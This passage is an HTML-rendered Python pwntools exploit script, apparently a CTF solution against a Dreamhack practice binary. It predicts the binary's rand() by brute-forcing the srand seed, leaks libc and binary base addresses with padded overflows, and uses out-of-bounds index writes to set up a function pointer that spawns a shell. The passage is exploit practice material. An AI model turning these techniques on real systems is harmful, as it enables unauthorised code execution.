</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#ae81ff">3</span>) <span style="color:#a6e22e">place</span> <span style="color:#a6e22e">get</span> <span style="color:#a6e22e">shell</span> <span style="color:#a6e22e">func</span> <span style="color:#a6e22e">through</span> <span style="color:#a6e22e">OoB</span> <span style="color:#a6e22e">add</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#ae81ff">4</span>) <span style="color:#a6e22e">modify</span> <span style="color:#a6e22e">gamestep</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">exec</span> <span style="color:#a6e22e">that</span> <span style="color:#a6e22e">func</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">from</span> <span style="color:#a6e22e">pwn</span> <span style="color:#66d9ef">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#a6e22e">ctypes</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">libc</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">ctypes</span>.<span style="color:#a6e22e">CDLL</span>(<span style="color:#e6db74">&#39;/usr/lib/x86_64-linux-gnu/libc.so.6&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">def</span> <span style="color:#a6e22e">seed_brute</span>(<span style="color:#a6e22e">arr</span>)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">global</span> <span style="color:#a6e22e">libc</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ret</span> <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">i</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">range</span>(<span style="color:#ae81ff">0x10000</span>)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">libc</span>.<span style="color:#a6e22e">srand</span>(<span style="color:#a6e22e">i</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">f</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">j</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">arr</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">j</span> <span style="color:#f92672">!=</span> (<span style="color:#a6e22e">libc</span>.<span style="color:#a6e22e">rand</span>()<span style="color:#f92672">%</span><span style="color:#ae81ff">10</span>)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">f</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">f</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">ret</span>.<span style="color:#a6e22e">append</span>(<span style="color:#a6e22e">i</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">ret</span>
</span></span><span style="display:flex;"><span>            
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sla</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">lambda</span> <span style="color:#a6e22e">x</span>,<span style="color:#a6e22e">y</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">sendlineafter</span>(<span style="color:#a6e22e">x</span>,<span style="color:#a6e22e">y</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sa</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">lambda</span> <span style="color:#a6e22e">x</span>,<span style="color:#a6e22e">y</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">sendafter</span>(<span style="color:#a6e22e">x</span>,<span style="color:#a6e22e">y</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">rvu</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">lambda</span> <span style="color:#a6e22e">x</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">recvuntil</span>(<span style="color:#a6e22e">x</span>)
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">p</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">process</span>(<span style="color:#e6db74">&#39;./bdh&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">p</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">remote</span>(<span style="color:#e6db74">&#39;host3.dreamhack.games&#39;</span>,<span style="color:#ae81ff">20804</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">def</span> <span style="color:#a6e22e">get_charm</span>()<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sla</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>,<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">rvu</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;[Charming Point]: &#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">n</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">int</span>(<span style="color:#a6e22e">rvu</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;.&#39;</span>)[<span style="color:#f92672">:-</span><span style="color:#ae81ff">1</span>])
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">n</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">res</span> <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">diff</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">500</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> <span style="color:#a6e22e">i</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">range</span>(<span style="color:#ae81ff">0x20</span>)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">v</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_charm</span>()
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">diff</span> <span style="color:#f92672">-=</span> <span style="color:#a6e22e">v</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">append</span>(<span style="color:#a6e22e">diff</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">diff</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">v</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ret</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">seed_brute</span>(<span style="color:#a6e22e">res</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">assert</span> <span style="color:#a6e22e">len</span>(<span style="color:#a6e22e">ret</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ret</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">ret</span>[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">success</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;seed : {ret}&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">libc</span>.<span style="color:#a6e22e">srand</span>(<span style="color:#a6e22e">ret</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> <span style="color:#a6e22e">i</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">range</span>(<span style="color:#a6e22e">len</span>(<span style="color:#a6e22e">res</span>))<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">libc</span>.<span style="color:#a6e22e">rand</span>()
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sla</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>,<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;3&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pay</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0xa8</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sa</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#a6e22e">pay</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pay</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x40</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sa</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#a6e22e">pay</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">rvu</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0xa8</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">libc_base</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">u64</span>(<span style="color:#a6e22e">rvu</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;]&#39;</span>)[<span style="color:#f92672">:-</span><span style="color:#ae81ff">1</span>].<span style="color:#a6e22e">ljust</span>(<span style="color:#ae81ff">8</span>,<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;\x00&#39;</span>)) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x8aeed</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">success</span>(<span style="color:#a6e22e">hex</span>(<span style="color:#a6e22e">libc_base</span>))
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">rvu</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x40</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">bin_base</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">u64</span>(<span style="color:#a6e22e">rvu</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;\x0a&#39;</span>)[<span style="color:#f92672">:-</span><span style="color:#ae81ff">1</span>].<span style="color:#a6e22e">ljust</span>(<span style="color:#ae81ff">8</span>,<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;\x00&#39;</span>)) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x81a0</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">success</span>(<span style="color:#a6e22e">hex</span>(<span style="color:#a6e22e">bin_base</span>))
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ((<span style="color:#a6e22e">libc</span>.<span style="color:#a6e22e">rand</span>()<span style="color:#f92672">%</span><span style="color:#ae81ff">10</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">libc</span>.<span style="color:#a6e22e">rand</span>()
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">functon</span> <span style="color:#a6e22e">ptr</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">824</span> <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">binary_ptr</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">ptr</span> <span style="color:#a6e22e">diff</span> <span style="color:#a6e22e">rw</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x5fb1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">lovegauge</span> 
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">oob</span> <span style="color:#a6e22e">idx</span> <span style="color:#f92672">-&gt;</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">101</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">def</span> <span style="color:#a6e22e">oob_add</span>(<span style="color:#a6e22e">idx</span>, <span style="color:#a6e22e">x</span>)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">global</span> <span style="color:#a6e22e">libc</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#a6e22e">True</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">r</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">libc</span>.<span style="color:#a6e22e">rand</span>()
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">is_add</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">not</span> (<span style="color:#a6e22e">r</span><span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">is_add</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">val</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">libc</span>.<span style="color:#a6e22e">rand</span>()) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>
</span></span><span style="display:flex;"><span>            <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">success</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;adding: {hex(x)}&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">x</span> <span style="color:#f92672">-=</span> <span style="color:#a6e22e">val</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">libc</span>.<span style="color:#a6e22e">rand</span>()
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">sla</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>,<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">sla</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;Choose: &#39;</span>,<span style="color:#a6e22e">str</span>(<span style="color:#a6e22e">idx</span>))
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">x</span> <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">sla</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>,<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">def</span> <span style="color:#a6e22e">oob_sub</span>(<span style="color:#a6e22e">idx</span>, <span style="color:#a6e22e">x</span>,<span style="color:#a6e22e">f</span>)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">global</span> <span style="color:#a6e22e">libc</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#a6e22e">True</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">is_sub</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">libc</span>.<span style="color:#a6e22e">rand</span>()<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">is_sub</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">f</span><span style="color:#f92672">==</span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">val</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">libc</span>.<span style="color:#a6e22e">rand</span>()) <span style="color:#f92672">%</span> <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">val</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">libc</span>.<span style="color:#a6e22e">rand</span>()) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>
</span></span><span style="display:flex;"><span>            <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">success</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;subtracting: {hex(x)}&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">f</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">x</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">val</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">sla</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>,<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">sla</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>,<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">x</span> <span style="color:#f92672">-=</span> <span style="color:#a6e22e">val</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">libc</span>.<span style="color:#a6e22e">rand</span>()
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">sla</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>,<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">idx</span> <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">102</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#960050;background-color:#1e0010">#</span>     <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">hex</span>(<span style="color:#a6e22e">val</span>))
</span></span><span style="display:flex;"><span>            <span style="color:#960050;background-color:#1e0010">#</span>     <span style="color:#a6e22e">pause</span>()
</span></span><span style="display:flex;"><span>            
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">sla</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;Choose: &#39;</span>,<span style="color:#a6e22e">str</span>(<span style="color:#a6e22e">idx</span>))
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">rvu</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;[Love Gauge]: &#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">n</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">int</span>(<span style="color:#a6e22e">rvu</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;.&#39;</span>)[<span style="color:#f92672">:-</span><span style="color:#ae81ff">1</span>])
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">f</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">n</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">oob_add</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">101</span>, <span style="color:#ae81ff">0x50</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">f</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">x</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">x</span> <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">sla</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>,<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">def</span> <span style="color:#a6e22e">oob_sub_at_once</span>(<span style="color:#a6e22e">idx</span>, <span style="color:#a6e22e">x</span>)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">global</span> <span style="color:#a6e22e">libc</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#a6e22e">True</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">is_sub</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">libc</span>.<span style="color:#a6e22e">rand</span>()<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">is_sub</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">val</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">libc</span>.<span style="color:#a6e22e">rand</span>()) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>
</span></span><span style="display:flex;"><span>            <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">success</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;subtracting: {hex(x)}&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">val</span> <span style="color:#f92672">!=</span> <span style="color:#a6e22e">x</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">sla</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>,<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">sla</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>,<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">x</span> <span style="color:#f92672">-=</span> <span style="color:#a6e22e">val</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">libc</span>.<span style="color:#a6e22e">rand</span>()
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">sla</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>,<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">sla</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;Choose: &#39;</span>,<span style="color:#a6e22e">str</span>(<span style="color:#a6e22e">idx</span>))
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">x</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">sla</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>,<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">oob_sub</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">0x67</span>, <span style="color:#ae81ff">0x5fb1</span>, <span style="color:#ae81ff">1</span>) <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">preparing</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">ptr</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">success</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;prepared fptr&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">r</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">libc</span>.<span style="color:#a6e22e">rand</span>()
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sla</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>,<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">rvu</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;[Love Gauge]: &#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">n</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">int</span>(<span style="color:#a6e22e">rvu</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;.&#39;</span>)[<span style="color:#f92672">:-</span><span style="color:#ae81ff">1</span>])
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">success</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;gauge: {n}&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">x</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">n</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">200</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#a6e22e">True</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">tmp</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">libc</span>.<span style="color:#a6e22e">rand</span>()
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">is_sub</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">tmp</span><span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">is_sub</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">libc</span>.<span style="color:#a6e22e">rand</span>()
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">val</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">tmp</span> <span style="color:#f92672">%</span> <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">x</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">val</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">sla</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>,<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">sla</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>,<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">x</span> <span style="color:#f92672">-=</span> <span style="color:#a6e22e">val</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">libc</span>.<span style="color:#a6e22e">rand</span>()
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">sla</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>,<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">sla</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;Choose: &#39;</span>,<span style="color:#a6e22e">str</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">100</span>))
